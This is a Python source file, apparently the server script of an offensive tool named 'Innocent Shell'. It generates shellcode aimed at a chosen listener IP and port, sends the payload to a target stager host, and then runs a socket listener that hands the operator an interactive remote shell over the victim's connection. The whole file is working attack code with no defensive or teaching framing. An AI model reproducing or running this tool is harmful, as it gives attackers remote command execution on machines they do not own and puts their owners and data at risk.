import code
import payload
import argparse
import socket
import os
import socket, sys, time
import threading
from termcolor import colored


desc = "\n"+r"""                  _____                                  _      _____ _          _ _ 
		 |_   _|                                | |    / ____| |        | | |
		   | |  _ __  _ __   ___   ___ ___ _ __ | |_  | (___ | |__   ___| | |
		   | | | '_ \| '_ \ / _ \ / __/ _ \ '_ \| __|  \___ \| '_ \ / _ \ | |
		  _| |_| | | | | | | (_) | (_|  __/ | | | |_   ____) | | | |  __/ | |
		 |_____|_| |_|_| |_|\___/ \___\___|_| |_|\__| |_____/|_| |_|\___|_|_|
				
				Use python serv.py -h to get to the help menu
"""
def sender(conn):
	while True:
		try:
			command = str(input())
			conn.send((command+"\n").encode())
		except:
			print("[+] - Connection Closed.")
			return None

def reciever(conn):
	while True:
		try:
			reply = conn.recv(32768)
			print(colored(reply.decode(), 'green'))
		except:
			print("[+] - Connection Closed.")
			return None
			
	

print(colored(desc, 'red', attrs=['bold']))
parser = argparse.ArgumentParser(desc)
parser.add_argument("-lip", "--listenerIP", help = "To Enter Server's IP")
parser.add_argument("-lport", "--listenerPort", help = "To Enter Server's Port")
parser.add_argument("-sip", "--StagerIP", help = "To Enter Clients's IP")
parser.add_argument("-sport", "--StagerPort", help = "To Enter Clients's IP")
parser.add_argument("-nc", "--listen", help = "To check for listening terminal")
args = parser.parse_args()

shellcode=code.getShellCode(code.prepare(code.asm, args.listenerIP, int(args.listenerPort)), os.getcwd())
payload.drop(shellcode, args.StagerIP, int(args.StagerPort))
if int(args.listen) == 1:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((args.listenerIP, int(args.listenerPort)))
	s.listen(1)
	print(f"[+] - Server listening on Port [{args.listenerIP}] : [{args.listenerPort}]")
	ans = ''
	(conn, address) = s.accept()
	thread = threading.Thread(target = sender, args=(conn, )).start()
	thread = threading.Thread(target = reciever, args=(conn, )).start()
	print(f"\n[+] - Server Connected to client at [{address[0]} ] : [ {address[1]}]")
